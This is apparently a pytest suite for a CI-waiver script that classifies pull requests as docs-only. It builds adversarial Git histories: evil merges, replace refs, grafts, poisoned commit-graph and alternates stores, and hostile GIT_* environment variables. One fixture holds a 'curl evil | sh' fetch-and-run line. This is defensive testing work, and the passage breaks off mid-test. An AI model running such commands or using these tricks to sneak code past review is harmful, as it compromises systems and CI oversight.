"""Mechanical CI waivers against real temporary Git histories and a fake gh (no network)."""
import json
import os
import shutil
import subprocess
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
SCRIPT = Path(os.environ.get("CI_WAIVER_TEST_SCRIPT", ROOT / "bin/ci-waiver"))


class History:
    def __init__(self, tmp):
        self.repo = tmp / "repo"
        self.repo.mkdir()
        self.env = {**{k: v for k, v in os.environ.items() if not k.startswith("GIT_")},
                    "GIT_AUTHOR_NAME": "Fixture", "GIT_AUTHOR_EMAIL": "fixture@example.test",
                    "GIT_COMMITTER_NAME": "Fixture", "GIT_COMMITTER_EMAIL": "fixture@example.test"}
        self.git("init", "-b", "master")
        if decider := os.environ.get("WAIVER_CI_DECIDER"):
            subprocess.run([decider, "ci", "decide", str(self.repo), "local",
                            "Isolated local Git history for CI-waiver regression/mutation; not hosted CI"],
                           env=self.env, check=True, capture_output=True, text=True, timeout=15)
        self.commit({"code.py": "original\n", "CHANGELOG.md": "initial\n",
                     ".github/workflows/test.yml": "name: tests\n"})
        self.base = self.git("rev-parse", "HEAD")
        shim = tmp / "shim"
        shim.mkdir()
        self.routes = tmp / "routes.json"
        gh = shim / "gh"
        gh.write_text("#!/usr/bin/env python3\nimport os,sys,json\nroutes=json.load(open(os.environ['WAIVER_ROUTES'])); r=routes.get(sys.argv[-1],routes.get(sys.argv[-1].split('?')[0]))\nif r is None: sys.exit(1)\nif os.environ.get('WAIVER_GH_AUDIT'):\n with open(os.environ['WAIVER_GH_AUDIT'],'a') as f: f.write(json.dumps(sys.argv[1:])+'\\n')\nif isinstance(r,dict) and '__pages__' in r:\n for p in r['__pages__']: print(json.dumps(p))\nelse: print(json.dumps(r))\n")
        gh.chmod(0o755)
        self.env.update(PATH=str(shim) + os.pathsep + self.env["PATH"], WAIVER_ROUTES=str(self.routes))
        self.routes.write_text("{}")
        self.real_git = shutil.which("git")
        self.upstream = tmp / "github.git"
        # Replace only the transport destination. Everything after fetch runs in
        # real Git with an independent upstream object store, never the checkout.
        self.transport = shim / "git"
        self.transport.write_text("#!/usr/bin/env python3\nimport os,sys\n"
            "args=sys.argv[1:]\n"
            "if os.environ.get('WAIVER_GIT_AUDIT'):\n"
            " import json\n"
            " with open(os.environ['WAIVER_GIT_AUDIT'],'a') as f: f.write(json.dumps([args,os.getcwd(),{k:v for k,v in os.environ.items() if k.startswith('GIT_')}])+'\\n')\n"
            "if '--verify' in args and os.environ.get('WAIVER_BAD_COMMIT') and args[-1]==os.environ['WAIVER_BAD_COMMIT']+'^{commit}': print('f'*40); sys.exit(0)\n"
            "if 'fetch' in args and 'https://github.com/r/p.git' in args:\n"
            " args=[os.environ['WAIVER_UPSTREAM'] if a=='https://github.com/r/p.git' else a for a in args]\n"
            " args=['-c','protocol.file.allow=always',*args]\n"
            "os.execv(" + repr(self.real_git) + ", [" + repr(self.real_git) + ",*args])\n")
        self.transport.chmod(0o755)
        self.env["WAIVER_UPSTREAM"] = str(self.upstream)

    def publish(self):
        env = {k: v for k, v in self.env.items() if not k.startswith("GIT_")}
        env.update(GIT_NO_REPLACE_OBJECTS="1", GIT_CONFIG_GLOBAL=os.devnull, GIT_CONFIG_NOSYSTEM="1")
        subprocess.run([self.real_git, "-c", "core.commitGraph=false", "clone", "--bare", "--no-local",
                        str(self.repo), str(self.upstream)], env=env, check=True, capture_output=True, timeout=60)

    def git(self, *args):
        return subprocess.run(["git", *args], cwd=self.repo, env=self.env, check=True,
                              capture_output=True, text=True).stdout.strip()

    def commit(self, files):
        for path, body in files.items():
            p = self.repo / path
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_text(body)
        self.git("add", "--", *files)
        self.git("commit", "-m", "fixture")
        return self.git("rev-parse", "HEAD")

    def merge(self, docs_conflict=False):
        self.git("checkout", "-b", "topic")
        self.h0 = self.commit({"feature.py": "feature\n", **({"CHANGELOG.md": "topic\n"} if docs_conflict else {})})
        self.git("checkout", "master")
        self.target = self.commit({"master.py": "master\n", **({"CHANGELOG.md": "master\n"} if docs_conflict else {})})
        self.git("checkout", "topic")
        r = subprocess.run(["git", "merge", "--no-ff", "--no-commit", "master"], cwd=self.repo,
                           env=self.env, capture_output=True)
        assert r.returncode == (1 if docs_conflict else 0), r.stderr
        if docs_conflict:
            (self.repo / "CHANGELOG.md").write_text("human combined notes\n")
            self.git("add", "CHANGELOG.md")
        self.git("commit", "-m", "merge")

    def classify(self, base=None, head="HEAD", pr=None, script=SCRIPT, cwd=None):
        pr = hasattr(self, "h0") if pr is None else pr
        if pr:
            routes = json.loads(self.routes.read_text())
            routes["repos/r/p/pulls/1"] = {"number": 1, "base": {"ref": getattr(self, "base_ref", "master"),
                "sha": base or self.base}, "head": {"sha": self.git("rev-parse", head),
                    "ref": "topic", "repo": {"full_name": "r/p"}}}
            routes.setdefault("repos/r/p/branches/master", {"commit": {"sha": self.base}})
            routes.setdefault("repos/r/p/issues/1/timeline", [])
            self.routes.write_text(json.dumps(routes))
            if not self.upstream.exists():
                self.publish()
        args = ["--pr", "1"] if pr else ["--base", base or self.base, "--head", head]
        r = subprocess.run([sys.executable, str(script), "classify", "--repo-dir", str(self.repo),
                            *args, "--repo", "r/p", "--json"],
                           cwd=cwd or self.repo, env=self.env, check=True, capture_output=True, text=True)
        return json.loads(r.stdout)


@pytest.fixture
def history(tmp_path):
    return History(tmp_path)


@pytest.mark.parametrize("path", ["CHANGELOG.md", "docs/handoffs/nested/handoff.md"])
def test_ci_waiver_docs_only(history, path):
    history.commit({path: "notes\n"})
    assert history.classify()["class"] == "docs-only"


@pytest.mark.parametrize("path", ["code.py", "docs/other.md", "skills/example/SKILL.md", "AGENTS.md"])
def test_ci_waiver_nonallowlist(history, path):
    history.commit({"CHANGELOG.md": "notes\n", path: "code\n"})
    got = history.classify()
    assert got["class"] == "none"
    assert "touches-nonwaivable:" + path in got["reasons"]


def test_ci_waiver_non_merge_code_change_has_no_merge_reason(history):
    history.commit({"code.py": "changed\n"})
    assert history.classify()["reasons"] == ["touches-nonwaivable:code.py"]


def test_ci_waiver_empty_diff_is_not_docs_only(history):
    got = history.classify(base=history.base, head="HEAD")
    assert got["class"] == "none" and got["reasons"] == ["no-changes"]


def test_ci_waiver_rename_examines_both_sides(history):
    # Without --no-renames only the docs-looking destination would be listed.
    (history.repo / "docs/handoffs").mkdir(parents=True)
    history.git("mv", "code.py", "docs/handoffs/code.py")
    history.git("commit", "-m", "rename")
    got = history.classify()
    assert got["class"] == "none" and got["reasons"] == ["touches-nonwaivable:code.py"]


def test_ci_waiver_shallow_and_missing_parent(history):
    history.commit({"CHANGELOG.md": "notes\n"})
    (history.repo / ".git/shallow").write_text(history.git("rev-parse", "HEAD") + "\n")
    got = history.classify()
    assert got["class"] == "none" and "shallow-history" in got["reasons"]
    (history.repo / ".git/shallow").unlink()
    assert history.classify(head="f" * 40)["class"] == "none"


@pytest.mark.parametrize("flag", ["conflict-free", "docs-conflict"])
@pytest.mark.parametrize("pr", [True, False])
def test_ci_waiver_master_merge_is_not_waivable(history, flag, pr):
    history.merge(docs_conflict=flag == "docs-conflict")
    got = history.classify(pr=pr)
    assert got["class"] == "none"
    assert got["reasons"] == ["merge-in-pr-history"]


@pytest.mark.parametrize("pr", [False, True])
def test_ci_waiver_r6_criss_cross(history, pr):
    # A and B are incomparable. Master's normal merge keeps both; the evil
    # merge keeps only A's tree, silently reverting B's code/test additions.
    history.git("checkout", "-b", "a")
    a = history.commit({"docs/handoffs/a.md": "A\n"})
    history.git("checkout", "-b", "b", history.base)
    b = history.commit({"bin/tool": "tool\n", "tests/test_tool.py": "test\n"})
    history.git("checkout", "master")
    history.git("merge", "--no-ff", a, "-m", "A")
    history.git("merge", "--no-ff", b, "-m", "B")
    base = history.git("rev-parse", "HEAD")
    evil = history.git("commit-tree", a + "^{tree}", "-p", a, "-p", b, "-m", "evil merge")
    history.git("checkout", "-b", "evil", evil)
    head = history.commit({"docs/handoffs/tip.md": "docs tip\n"})
    assert set(history.git("merge-base", "--all", base, head).split()) == {a, b}
    assert history.git("diff", "--name-only", a, head) == "docs/handoffs/tip.md"
    tree = history.git("merge-tree", "--write-tree", base, head)
    assert {"bin/tool", "tests/test_tool.py"} <= set(history.git("diff", "--name-only", base, tree).splitlines())
    history.routes.write_text(json.dumps({"repos/r/p/branches/master": {"commit": {"sha": base}}}))
    got = history.classify(base=base, pr=pr)
    assert got["class"] == "none" and got["reasons"] == ["multiple-merge-bases"]


@pytest.mark.parametrize("pr", [False, True])
@pytest.mark.parametrize("tip", [False, True])
def test_ci_waiver_r6_merge_in_docs_history(history, pr, tip):
    history.git("checkout", "-b", "docs")
    history.commit({"docs/handoffs/one.md": "one\n"})
    history.git("checkout", "-b", "other", history.base)
    history.commit({"docs/handoffs/two.md": "two\n"})
    history.git("checkout", "docs")
    history.git("merge", "--no-ff", "other", "-m", "docs merge")
    if tip:
        history.commit({"docs/handoffs/tip.md": "linear docs tip\n"})
    got = history.classify(pr=pr)
    assert got["class"] == "none" and got["reasons"] == ["merge-in-pr-history"]


@pytest.mark.parametrize("pr", [False, True])
@pytest.mark.parametrize("conflict", [False, True])
def test_ci_waiver_r6_linear_merge_result(history, pr, conflict):
    history.git("checkout", "-b", "docs")
    history.commit({"CHANGELOG.md": "topic notes\n"})
    history.git("checkout", "master")
    base = history.commit({"CHANGELOG.md": "master notes\n"} if conflict else {"code.py": "master code\n"})
    history.git("checkout", "docs")
    history.routes.write_text(json.dumps({"repos/r/p/branches/master": {"commit": {"sha": base}}}))
    got = history.classify(base=base, pr=pr)
    assert got["class"] == ("none" if conflict else "docs-only")
    assert got["reasons"] == (["merge-result-not-docs-only"] if conflict else ["only-waivable-paths"])


@pytest.mark.parametrize("pr", [False, True])
def test_ci_waiver_r6_already_applied_docs(history, pr):
    history.git("checkout", "-b", "docs")
    history.commit({"CHANGELOG.md": "identical notes\n"})
    history.git("checkout", "master")
    base = history.commit({"CHANGELOG.md": "identical notes\n", "code.py": "master code\n"})
    history.git("checkout", "docs")
    history.routes.write_text(json.dumps({"repos/r/p/branches/master": {"commit": {"sha": base}}}))
    got = history.classify(base=base, pr=pr)
    assert got["class"] == "none" and got["reasons"] == ["merge-result-not-docs-only"]


@pytest.mark.parametrize("pr", [False, True])
def test_ci_waiver_r6_shared_merge_allows_linear_docs(history, pr):
    history.merge()
    history.base = history.git("rev-parse", "HEAD")
    history.commit({"docs/handoffs/linear.md": "docs after shared merge\n"})
    got = history.classify(pr=pr)
    assert got["class"] == "docs-only" and got["reasons"] == ["only-waivable-paths"]


@pytest.mark.parametrize("unsafe", ["code.py", "docs/handoffs/tests/hidden.py", "executable"])
def test_ci_waiver_r6_merge_result_policy(history, unsafe):
    # Fault injection isolates the defense-in-depth result check from the
    # history guards: the merge engine returns a clean but unsafe result tree.
    path = "docs/handoffs/run.md" if unsafe == "executable" else unsafe
    history.commit({path: "unsafe\n"})
    if unsafe == "executable":
        (history.repo / path).chmod(0o755)
        history.git("add", path)
        history.git("commit", "-m", "executable")
    tree = history.git("rev-parse", "HEAD^{tree}")
    # Keep the injected tree reachable in the fetched ancestry, then make the
    # actual PR's unique-ancestor diff a regular docs-only change.
    history.git("revert", "--no-edit", "HEAD")
    history.base = history.git("rev-parse", "HEAD")
    history.commit({"docs/handoffs/safe.md": "safe\n"})
    source = history.transport.read_text()
    history.transport.write_text(source.replace("os.execv(",
        "if 'merge-tree' in args: print(" + repr(tree) + "); sys.exit(0)\nos.execv("))
    got = history.classify(pr=True)
    assert got["class"] == "none" and got["reasons"] == ["merge-result-not-docs-only"]


def test_ci_waiver_pr_reads_exact_base_and_head(history):
    head = history.commit({"CHANGELOG.md": "notes\n"})
    history.routes.write_text(json.dumps({"repos/r/p/pulls/1": {"base": {"sha": history.base}, "head": {"sha": head}}}))
    got = history.classify(pr=True)
    assert got["class"] == "docs-only" and got["head"] == head


def test_ci_waiver_symlink_finds_sibling_waiter(history):
    history.commit({"CHANGELOG.md": "notes\n"})
    link = history.repo / "ci-waiver-link"
    link.symlink_to(SCRIPT)
    assert history.classify(script=link)["class"] == "docs-only"


def test_ci_waiver_workflow_paths_equal_allowlist():
    import ast
    import yaml
    tree = ast.parse(SCRIPT.read_text())
    allowlist = next(ast.literal_eval(n.value) for n in tree.body if isinstance(n, ast.Assign) and any(isinstance(t, ast.Name) and t.id == "WAIVABLE_PATHS" for t in n.targets))
    workflow = yaml.load((ROOT / ".github/workflows/test.yml").read_text(), Loader=yaml.BaseLoader)
    for event in ("push", "pull_request"):
        assert workflow["on"][event]["paths-ignore"] == list(allowlist)
    assert workflow["on"]["push"]["branches"] == ["master"]


@pytest.mark.parametrize("path", ["Tests/conftest.py", "Bin/PR-WAIT", "bin/CI-WAIVER", "nested/TESTS/x.py",
    "nested/Conftest.py", "nested/Test_x.py", "claude/hooks/handoff-tools/tests/test_context_size_nudge.py",
    ".gitattributes", "nested/.gitattributes", ".gitmodules", ".gitignore", "nested/.gitcontrol",
    ".github/workflows/test.yml", "tests/test_x.py", "bin/pr-wait", "bin/ci-waiver", "config/x.toml"])
def test_ci_waiver_expanded_exclusions(history, path):
    history.commit({path: "excluded\n"})
    got = history.classify()
    assert got["class"] == "none" and "hard-exclusion:" + path in got["reasons"]


@pytest.mark.parametrize("kind", ["symlink", "executable", "gitlink"])
def test_ci_waiver_doc_modes(history, kind):
    path = "docs/handoffs/link"
    if kind == "symlink":
        p = history.repo / path
        p.parent.mkdir(parents=True)
        p.symlink_to("../../code.py")
        history.git("add", path)
    elif kind == "executable":
        path = "CHANGELOG.md"
        history.git("update-index", "--chmod=+x", path)
    else:
        history.git("update-index", "--add", "--cacheinfo", "160000," + history.base + "," + path)
    history.git("commit", "-m", "mode")
    got = history.classify()
    assert got["class"] == "none" and "unsafe-doc-mode:" + path in got["reasons"]


def test_ci_waiver_repo_dir_pinned(history, tmp_path):
    history.commit({"CHANGELOG.md": "notes\n"})
    assert history.classify(cwd=tmp_path)["class"] == "docs-only"


def test_ci_waiver_base_must_master(history):
    history.commit({"CHANGELOG.md": "notes\n"})
    history.base_ref = "other"
    got = history.classify(pr=True)
    assert got["class"] == "none" and "base-not-master" in got["reasons"]


def test_ci_waiver_normalizes_paths():
    import runpy
    mod = runpy.run_path(str(SCRIPT))
    for path in ("../CHANGELOG.md", "docs/handoffs/../../../code.py", "/CHANGELOG.md"):
        with pytest.raises(ValueError, match="unsafe-path"):
            mod["normalized"](path)
    assert mod["excluded"]("BIN//PR-WAIT")


def test_ci_waiver_git_dir_environment_ignored(history, tmp_path):
    history.commit({"CHANGELOG.md": "notes\n"})
    other = tmp_path / "other"
    other.mkdir()
    foreign = History(other)
    history.env["GIT_DIR"] = str(foreign.repo / ".git")
    assert history.classify(pr=False)["class"] == "docs-only"


@pytest.mark.parametrize("refbase", ["refs/replace", "refs/alternate-replace"])
def test_ci_waiver_r2_replace_ref_cannot_hide_code(history, refbase):
    fake = history.commit({"CHANGELOG.md": "notes\n"})
    history.git("checkout", "-b", "real", history.base)
    head = history.commit({"code.py": "def f(:\n", "CHANGELOG.md": "notes\n"})
    before = history.classify(head=head)
    assert before["class"] == "none"
    history.git("update-ref", refbase + "/" + head, fake)
    history.env.update(GIT_REPLACE_REF_BASE=refbase, GIT_NO_REPLACE_OBJECTS="0")
    assert history.classify(head=head) == before
    assert history.classify(head=head, pr=True) == {**before, "master": history.base}


def test_ci_waiver_r2_grafts_refused(history):
    history.commit({"CHANGELOG.md": "notes\n"})
    (history.repo / ".git/info/grafts").write_text(history.git("rev-parse", "HEAD") + "\n")
    got = history.classify()
    assert got["class"] == "none" and "git-grafts-present" in got["reasons"]


def test_ci_waiver_r2_environment_grafts_ignored(history, tmp_path):
    history.commit({"CHANGELOG.md": "notes\n"})
    grafts = tmp_path / "grafts"
    grafts.write_text(history.git("rev-parse", "HEAD") + "\n")
    history.env["GIT_GRAFT_FILE"] = str(grafts)
    assert history.classify()["class"] == "docs-only"


@pytest.mark.parametrize("path", ["changelog.md", "CHANGELOG.MD", "Docs/Handoffs/run.py",
                                   "docſ/handoffs/run.py", "docs//handoffs/run.py"])
def test_ci_waiver_r3_exact_allowlist(history, path):
    # Probe matching directly too: case-insensitive Mac filesystems can otherwise
    # preserve an existing CHANGELOG filename while changing its content.
    import runpy
    assert not runpy.run_path(str(SCRIPT))["waivable"](path)
    if path.casefold() != "changelog.md" and "//" not in path:
        history.commit({path: "new path"})
        assert history.classify()["class"] == "none"


def test_ci_waiver_r3_allowlist_no_unicode_normalization():
    import runpy
    import unicodedata
    mod = runpy.run_path(str(SCRIPT))
    # Neither current literal allowlist entry has a composed Unicode character;
    # use a decomposed Git path and a composed policy entry to detect NFC widening.
    mod["waivable"].__globals__["WAIVABLE_PATHS"] = ("docs/handoffs/café.md",)
    assert not mod["waivable"](unicodedata.normalize("NFD", "docs/handoffs/café.md"))


RETARGET_TIMELINES = {
    "base_ref_changed": [{"event": "base_ref_changed"}],
    "base_ref_deleted": [{"event": "base_ref_deleted"}],
    "automatic_base_change_succeeded": [{"event": "automatic_base_change_succeeded"}],
    # GitHub's own stacked-PR retarget records both, after other events, on a later page.
    "paged-automatic-retarget": {"__pages__": [[{"event": "labeled"}], [
        {"event": "base_ref_deleted"}, {"event": "automatic_base_change_succeeded"}]]},
}


@pytest.mark.parametrize("case", ["nonmaster-base", "stale-base", *RETARGET_TIMELINES])
def test_ci_waiver_r3_docs_base_provenance(history, case):
    history.git("checkout", "-b", "unmerged")
    unmerged = history.commit({"code.py": "unmerged code"})
    if case in ("nonmaster-base", "stale-base"):
        # API says master, but its (stale or foreign) base SHA still contains unmerged code.
        history.base = unmerged
    history.commit({"CHANGELOG.md": "docs"})
    history.routes.write_text(json.dumps({
        "repos/r/p/branches/master": {"commit": {"sha": history.git("rev-parse", "master")}},
        "repos/r/p/issues/1/timeline": RETARGET_TIMELINES.get(case, [])}))
    got = history.classify(pr=True)
    assert got["class"] == "none"
    assert got["reasons"] == ["pr-base-retargeted" if case in RETARGET_TIMELINES else "base-not-on-master"]


def test_ci_waiver_unrelated_timeline_events_do_not_refuse(history):
    history.commit({"CHANGELOG.md": "docs"})
    history.routes.write_text(json.dumps({"repos/r/p/issues/1/timeline": {"__pages__": [
        [{"event": "labeled"}, {"event": "head_ref_force_pushed"}],
        [{"event": "automatic_base_change_failed"}]]}}))
    assert history.classify(pr=True)["class"] == "docs-only"


@pytest.mark.parametrize("route", ["repos/r/p/issues/1/timeline", "repos/r/p/branches/master"])
@pytest.mark.parametrize("answer", [None, "bad", {"events": []}])
def test_ci_waiver_unreadable_github_evidence_fails_closed(history, route, answer):
    history.commit({"CHANGELOG.md": "docs"})
    history.routes.write_text(json.dumps({route: answer}))
    got = history.classify(pr=True)
    assert got["class"] == "none" and got["reasons"] != ["only-waivable-paths"]


@pytest.mark.parametrize("path", ["pyproject.toml", "nested/pytest.ini", "setup.cfg", "tox.ini",
                                   "uv.lock", "docs/handoffs/conftest.py", "docs/handoffs/requirements-dev.txt"])
def test_ci_waiver_r3_test_config_excluded(history, path):
    history.commit({path: "test configuration"})
    got = history.classify()
    assert got["class"] == "none" and "hard-exclusion:" + path in got["reasons"]


@pytest.mark.parametrize("poison", ["commit-graph", "alternates", "replace", "core-config", "missing-gitdir"])
def test_ci_waiver_r3_checkout_store_never_read(history, poison):
    fake = history.commit({"CHANGELOG.md": "notes"})
    fake_tree = history.git("rev-parse", fake + "^{tree}")
    history.git("checkout", "-b", "real", history.base)
    head = history.commit({"code.py": "def f(:", "CHANGELOG.md": "notes"})
    real_tree = history.git("rev-parse", head + "^{tree}")
    history.publish()  # freeze GitHub evidence before corrupting the checkout
    before = history.classify(pr=True, head=head)
    assert before["class"] == "none" and "touches-nonwaivable:code.py" in before["reasons"]
    if poison == "commit-graph":
        history.git("commit-graph", "write", "--reachable")
        graph = history.repo / ".git/objects/info/commit-graph"
        data = graph.read_bytes()
        assert data.count(bytes.fromhex(real_tree)) == 1
        tmp = graph.with_suffix(".tmp")
        tmp.write_bytes(data.replace(bytes.fromhex(real_tree), bytes.fromhex(fake_tree)))
        os.replace(tmp, graph)
        assert history.git("-c", "core.commitGraph=true", "diff", "--name-only", history.base, head) == "CHANGELOG.md"
    elif poison == "alternates":
        # Real head SHA, counterfeit loose object in an alternate store. The
        # checkout itself can resolve it after its genuine loose object is removed.
        import zlib
        evil = history.repo.parent / "evil-objects"
        dest = evil / head[:2] / head[2:]
        dest.parent.mkdir(parents=True)
        body = history.git("cat-file", "commit", head).replace(real_tree, fake_tree).encode()
        dest.write_bytes(zlib.compress(b"commit " + str(len(body)).encode() + b"\0" + body))
        (history.repo / ".git/objects" / head[:2] / head[2:]).unlink()
        (history.repo / ".git/objects/info/alternates").write_text(str(evil) + "\n")
    elif poison == "replace":
        history.git("update-ref", "refs/replace/" + head, fake)
    elif poison == "core-config":
        history.git("config", "core.repositoryformatversion", "999")
    else:
        (history.repo / ".git").rename(history.repo / "checkout-gitdir-hidden")
    # Bypass fixture head resolution, which intentionally cannot read a broken
    # checkout. The CLI gets all SHA inputs from its API, not from the checkout.
    r = subprocess.run([sys.executable, str(SCRIPT), "classify", "--repo-dir", str(history.repo),
                        "--pr", "1", "--repo", "r/p", "--json"], cwd=history.repo,
                       env=history.env, capture_output=True, text=True, check=True)
    assert json.loads(r.stdout) == before


def test_ci_waiver_r3_fetch_failure_not_waived(history):
    history.commit({"CHANGELOG.md": "docs"})
    history.publish()
    shutil.rmtree(history.upstream)
    # A valid local docs diff must not be used as fallback for failed GitHub fetch.
    history.upstream.mkdir()
    got = history.classify(pr=True)
    assert got["class"] == "none" and got["reasons"] == ["git-error:fetch"]


def test_ci_waiver_r3_private_fetch_audit(history):
    history.commit({"CHANGELOG.md": "docs\n"})
    history.env["WAIVER_GIT_AUDIT"] = str(history.repo.parent / "git-calls.jsonl")
    got = history.classify(pr=True)
    assert got["class"] == "docs-only"
    calls = [json.loads(line) for line in Path(history.env["WAIVER_GIT_AUDIT"]).read_text().splitlines()]
    calls = [(args, cwd, env) for args, cwd, env in calls if args != ["rev-parse", "HEAD"]]
    directories = {cwd for args, cwd, env in calls}
    assert len(directories) == 1 and str(history.repo) not in directories
    fetches = [args for args, cwd, env in calls if "fetch" in args]
    assert {args[-1] for args in fetches} == {history.base, got["head"]}
    for args in fetches:
        assert args[-2] == "https://github.com/r/p.git"
    for args, cwd, env in calls:
        assert "core.commitGraph=false" in args
        assert "gc.writeCommitGraph=false" in args and "fetch.writeCommitGraph=false" in args
        assert "protocol.allow=never" in args and "protocol.https.allow=always" in args
        assert env["GIT_NO_REPLACE_OBJECTS"] == "1" and env["GIT_CONFIG_NOSYSTEM"] == "1"
        assert env["GIT_CONFIG_GLOBAL"] == os.devnull
        assert "GIT_ALTERNATE_OBJECT_DIRECTORIES" not in env and "GIT_OBJECT_DIRECTORY" not in env
    assert not Path(next(iter(directories))).exists()  # private store removed


def test_ci_waiver_r3_each_fetched_sha_verified(history):
    head = history.commit({"CHANGELOG.md": "docs"})
    history.env["WAIVER_BAD_COMMIT"] = head
    got = history.classify(pr=True)
    assert got["class"] == "none" and got["reasons"] == ["fetched-commit-mismatch"]


def test_ci_waiver_r3_pr_cannot_select_offline_mode(history):
    r = subprocess.run([sys.executable, str(SCRIPT), "classify", "--repo-dir", str(history.repo),
                        "--pr", "1", "--base", history.base, "--head", history.base],
                       env=history.env, capture_output=True, text=True)
    assert r.returncode == 2 and "use --pr N OR" in r.stderr


def test_ci_waiver_r4_private_store_strips_inherited_git_environment(history):
    history.commit({"CHANGELOG.md": "docs\n"})
    assert history.classify(pr=True)["class"] == "docs-only"  # publish independent upstream
    history.git("config", "core.repositoryformatversion", "999")
    audit = history.repo.parent / "poison-env-audit.jsonl"
    env = {**history.env, "WAIVER_GIT_AUDIT": str(audit),
           "GIT_DIR": str(history.repo / ".git"),
           "GIT_OBJECT_DIRECTORY": str(history.repo / ".git/objects"),
           "GIT_ALTERNATE_OBJECT_DIRECTORIES": str(history.repo / ".git/objects"),
           "GIT_CONFIG_COUNT": "1", "GIT_CONFIG_KEY_0": "core.repositoryformatversion",
           "GIT_CONFIG_VALUE_0": "999"}
    # Invoke the actual CLI; fixture Git commands must not consume the poison.
    r = subprocess.run([sys.executable, str(SCRIPT), "classify", "--repo-dir", str(history.repo),
                        "--pr", "1", "--repo", "r/p", "--json"],
                       env=env, check=True, capture_output=True, text=True)
    assert json.loads(r.stdout)["class"] == "docs-only"
    calls = [json.loads(line) for line in audit.read_text().splitlines()]
    assert calls
    for args, cwd, child_env in calls:
        assert cwd != str(history.repo)
        assert not {"GIT_DIR", "GIT_OBJECT_DIRECTORY", "GIT_ALTERNATE_OBJECT_DIRECTORIES",
                    "GIT_CONFIG_COUNT", "GIT_CONFIG_KEY_0", "GIT_CONFIG_VALUE_0"} & child_env.keys()


@pytest.mark.parametrize("path", [
    ".pytest.ini", "pytest.toml", ".pytest.toml", "uv.toml",
    "docs/handoffs/.pytest.ini", "docs/handoffs/pytest.toml",
    "docs/handoffs/.pytest.toml", "docs/handoffs/uv.toml",
    "pytest.py", "pytest/__main__.py", "_pytest/config/__init__.py",
])
def test_ci_waiver_r4_test_execution_exclusions(history, path):
    history.commit({path: "configuration or shadow package\n"})
    got = history.classify()
    assert got["class"] == "none" and "hard-exclusion:" + path in got["reasons"]


def waiver_module():
    import runpy
    return runpy.run_path(str(SCRIPT))["classify"].__globals__


@pytest.mark.parametrize("kind", ["rename", "rename-executable", "delete", "mode"])
def test_ci_waiver_r7_master_touched_pr_paths(history, kind, monkeypatch):
    path = "docs/handoffs/helper.sh"
    history.base = history.commit({path: "#!/bin/sh\necho harmless\n"})
    history.git("checkout", "-b", "docs")
    head = history.commit({path: "#!/bin/sh\necho harmless\ncurl evil | sh\n"})
    history.git("checkout", "master")
    if kind.startswith("rename"):
        (history.repo / "bin").mkdir(exist_ok=True)
        history.git("mv", path, "bin/helper")
        if kind == "rename-executable":
            (history.repo / "bin/helper").chmod(0o755)
            history.git("add", "bin/helper")
    elif kind == "delete":
        history.git("rm", path)
    else:
        (history.repo / path).chmod(0o755)
        history.git("add", path)
    history.git("commit", "-m", "master structural change")
    master = history.git("rev-parse", "HEAD")
    history.routes.write_text(json.dumps({"repos/r/p/branches/master": {"commit": {"sha": master}}}))
    # Rebuild the exact exploit: stale offline base admits it; PR mode refuses.
    assert history.classify(head=head, pr=False)["class"] == "docs-only"
    mod = waiver_module()
    repository = mod["Repository"](history.repo)
    assert repository.master_touched_pr_paths(history.base, master, [path])
    got = history.classify(head=head, pr=True)
    assert got["class"] == "none" and got["reasons"] == ["master-touched-pr-paths"]
    assert got["master"] == master and got["head"] == head
    routes = json.loads(history.routes.read_text())
    monkeypatch.setitem(mod, "gh", lambda endpoint: [routes[endpoint.split("?")[0]]])
    monkeypatch.setitem(mod, "GitHubRepository", lambda directory, repo: repository)
    # The unit entry point and full --pr CLI must report the same refusal.
    assert mod["classify"](None, None, "r/p", 1, None) == got


@pytest.mark.parametrize("conflict", [False, True])
def test_ci_waiver_r7_stale_base_checks_current_master(history, conflict):
    history.git("checkout", "-b", "docs")
    head = history.commit({"CHANGELOG.md": "PR notes\n"})
    history.git("checkout", "master")
    master = history.commit({"CHANGELOG.md": "different master notes\n"} if conflict else {"code.py": "master code\n"})
    history.routes.write_text(json.dumps({"repos/r/p/branches/master": {"commit": {"sha": master}}}))
    got = history.classify(head=head, pr=True)
    assert got["class"] == ("none" if conflict else "docs-only")
    assert got["master"] == master
    assert got["reasons"] == (["merge-result-not-docs-only"] if conflict else ["only-waivable-paths"])
    if not conflict:
        assert got["merge_tree"] == history.git("merge-tree", "--write-tree", master, head)


@pytest.mark.parametrize("kind", ["code", "excluded", "mode", "tree", "parent", "two-parents", "empty"])
def test_ci_waiver_r7_verify_actual_squash(history, kind):
    mod = waiver_module()
    parent = history.base
    history.commit({"docs/handoffs/notes.md": "reviewed notes\n"})
    tree = history.git("rev-parse", "HEAD^{tree}")
    proof = {"master": parent, "merge_tree": tree}
    clean = history.git("commit-tree", tree, "-p", parent, "-m", "squash")
    r = mod["Repository"](history.repo)
    mod["verify_squash"](r, clean, proof)
    actual_parent = parent
    parents = ["-p", parent]
    if kind in ("code", "excluded", "tree"):
        path = {"code": "code.py", "excluded": "docs/handoffs/tests/hook.py", "tree": "docs/handoffs/notes.md"}[kind]
        history.commit({path: "unreviewed payload\n"})
        tree = history.git("rev-parse", "HEAD^{tree}")
    elif kind == "mode":
        (history.repo / "docs/handoffs/notes.md").chmod(0o755)
        history.git("add", "docs/handoffs/notes.md")
        history.git("commit", "-m", "mode")
        tree = history.git("rev-parse", "HEAD^{tree}")
    elif kind == "parent":
        # Even an empty master advance with identical trees is detected.
        actual_parent = history.git("commit-tree", parent + "^{tree}", "-p", parent, "-m", "advance")
        parents = ["-p", actual_parent]
    elif kind == "two-parents":
        parents += ["-p", clean]
    else:
        tree = history.git("rev-parse", parent + "^{tree}")
    squash = history.git("commit-tree", tree, *parents, "-m", "actual squash")
    if kind in ("code", "excluded", "mode", "empty"):
        # Isolate each defense even if a corrupted proof supplies this tree.
        proof["merge_tree"] = tree
    with pytest.raises(ValueError):
        mod["verify_squash"](r, squash, proof)


@pytest.mark.parametrize("case", ["clean", "denied", "head", "mismatch", "unknown", "merge-error", "checks-failed", "post-head", "post-base", "no-master", "no-tree"])
def test_ci_waiver_r7_merge_wrapper(history, monkeypatch, capsys, case):
    mod = waiver_module()
    # The wrapper must match the fetched master's bytes before any mutation.
    history.base = history.commit({"bin/ci-waiver": SCRIPT.read_text()})
    history.git("checkout", "-b", "docs")
    head = history.commit({"docs/handoffs/notes.md": "reviewed\n"})
    master = history.base
    tree = history.git("merge-tree", "--write-tree", master, head)
    if case == "mismatch":
